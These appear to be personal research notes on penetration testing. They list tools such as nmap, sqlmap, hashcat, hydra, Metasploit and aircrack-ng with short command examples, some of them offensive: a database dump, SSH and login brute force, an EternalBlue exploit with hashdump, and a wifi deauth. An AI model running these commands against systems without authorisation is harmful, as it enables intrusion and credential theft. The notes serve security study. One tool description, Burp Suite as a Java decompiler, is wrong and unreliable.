# Network Security Tools - Research Notes
## 2026-03-14

---

## 1. Network Discovery & Reconnaissance

### Nmap - Network Scanner
```bash
# Basic scans
nmap 192.168.1.1                    # Basic scan
nmap -sV 192.168.1.1                # Version detection
nmap -sC 192.168.1.1                # Default scripts
nmap -p- 192.168.1.1                # All ports
nmap -A 192.168.1.1                  # Aggressive scan

# Scan types
nmap -sS 192.168.1.1                 # SYN scan (stealth)
nmap -sT 192.168.1.1                 # TCP connect
nmap -sU 192.168.1.1                 # UDP scan

# Output
nmap -oA scanme 192.168.1.1          # All output formats
nmap -oN scan.nmap 192.168.1.1       # Normal output
nmap -oX scan.xml 192.168.1.1        # XML output
```

### Other Discovery Tools
```bash
# Netdiscover - ARP discovery
netdiscover -i eth0 -r 192.168.1.0/24

# masscan - Fast port scanner
masscan -p1-65535 192.168.1.1 --rate=1000

# fping - Multiple host ping
fping -g 192.168.1.0/24

# arping - ARP ping
arping -c 3 192.168.1.1
```

---

## 2. Packet Sniffing & Analysis

### Wireshark
- Graphical packet analyzer
- Filter with BPF syntax
- Follow TCP streams
- Decode protocols

### tcpdump
```bash
# Basic capture
tcpdump -i eth0

# Filter by host
tcpdump host 192.168.1.1

# Filter by port
tcpdump port 80

# Save to file
tcpdump -i eth0 -w capture.pcap

# Read from file
tcpdump -r capture.pcap
```

### Other Sniffers
- **Ethereal** - Wireshark predecessor
- **Ettercap** - MITM attacks
- **dsniff** - Password sniffer

---

## 3. Vulnerability Scanning

### OpenVAS
```bash
# Start Greenbone
omp -u admin -w admin -h localhost --xml-start-task

# Or use web interface
firefox https://localhost:9392
```

### Nessus
- Commercial vulnerability scanner
- Plugins for specific vulnerabilities
- Compliance scanning

### Nexpose
- Rapid7 vulnerability management
- Real-time risk scoring

---

## 4. Web Application Testing

### Burp Suite
- Intercepting proxy
- Spider/crawler
- Intruder (fuzzing)
- Repeater
- Decoder

### OWASP ZAP
```bash
# Command line
zap.sh -cmd -quick-scan -sc -port 8080 -host target.com
```

### SQL Injection
```bash
# sqlmap
sqlmap -u "http://target.com/page?id=1"
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" --dump -D database -T users
```

---

## 5. Password Attacks

### Hashcat
```bash
# Basic usage
hashcat -m 0 hash.txt wordlist.txt           # MD5
hashcat -m 1000 hash.txt wordlist.txt        # NTLM
hashcat -m 1800 hash.txt wordlist.txt        # SHA-512

# Rules
hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule
```

### John the Ripper
```bash
# Basic
john hash.txt

# Wordlist
john --wordlist=wordlist.txt hash.txt

# Formats
john --format=raw-md5 hash.txt
```

### Hydra
```bash
# SSH
hydra -l user -P wordlist.txt ssh://192.168.1.1

# HTTP POST
hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
```

---

## 6. Exploitation Frameworks

### Metasploit
```bash
# Start
msfconsole

# Search
search type:exploit platform:windows

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Options
set RHOSTS 192.168.1.1
set LHOST 192.168.1.100
set LPORT 4444

# Run
run

# Meterpreter
sysinfo
getuid
hashdump
```

### Other Frameworks
- **Cobalt Strike** - Red team operations
- **Empire** - Post-exploitation (PowerShell)
- **Covenant** - .NET C2 framework
- **Sliver** - Cross-platform C2

---

## 7. Wireless Security

### Aircrack-ng
```bash
# Monitor mode
airmon-ng start wlan0

# Capture handshakes
airodump-ng wlan0mon
airodump-ng -c 1 --bssid MAC -w capture wlan0mon

# Deauth attack
aireplay-ng -0 1 -a AP_MAC -c CLIENT_MAC wlan0mon

# Crack
aircrack-ng -w wordlist.txt capture.cap
```

### Other Wireless Tools
- **Wireshark** - Protocol analysis
- **Reaver** - WPS attack
- **Fern Wifi Cracker** - GUI tool
- **Kismet** - Wireless detector

---

## 8. Reverse Engineering

### Ghidra
- NSA-developed disassembler
- Decompiler for multiple architectures
- Scriptable

### Other Tools
- **IDA Pro** - Commercial disassembler
- **Radare2** - Command-line framework
- **Burp Suite** - Java decompiler

---

## 9. OSINT Tools

### Information Gathering
```bash
# theHarvester
theHarvester -d target.com -b all

# Recon-ng
recon-ng
workspaces create target
modules search domains
```

### Domain Tools
- **Whois** - Domain registration info
- **Dig/NSLookup** - DNS queries
- **Sublist3r** - Subdomain enumeration

---

## 10. Privilege Escalation

### Linux
- LinPEAS automated script
- SUID binaries
- Sudo permissions
- Kernel exploits

### Windows
- WinPEAS
- PowerUp
- Mimikatz
- Windows Exploit Suggester

---

## 11. Essential Tools Summary

| Category | Tools |
|----------|-------|
| Scanning | nmap, masscan, netdiscover |
| Sniffing | Wireshark, tcpdump |
| Web | Burp, ZAP, sqlmap |
| Password | hashcat, john, hydra |
| Exploitation | Metasploit, Cobalt Strike |
| Wireless | aircrack-ng, reaver |
| OSINT | theHarvester, Maltego |

---

## 12. Practice Platforms

- **HackTheBox** - Penetration testing labs
- **TryHackMe** - Beginner-friendly labs
- **VulnHub** - Vulnerable VMs
- **PentesterLab** - Web security
- **OverTheWire** - Wargames

---

## 13. Security Distributions

- **Kali Linux** - Debian-based pentest OS
- **Parrot OS** - Security-focused distro
- **BlackArch** - Arch-based pentest
- **Remnux** - Malware analysis

---

## 14. Books for Learning

1. "Black Hat Python" - Justin Seitz
2. "Metasploit: The Penetration Tester's Guide"
3. "Penetration Testing: A Hands-On Introduction to Hacking"
4. "The Hacker Playbook" series
5. "RTFM: Red Team Field Manual"

---

*Last Updated: 2026-03-14*
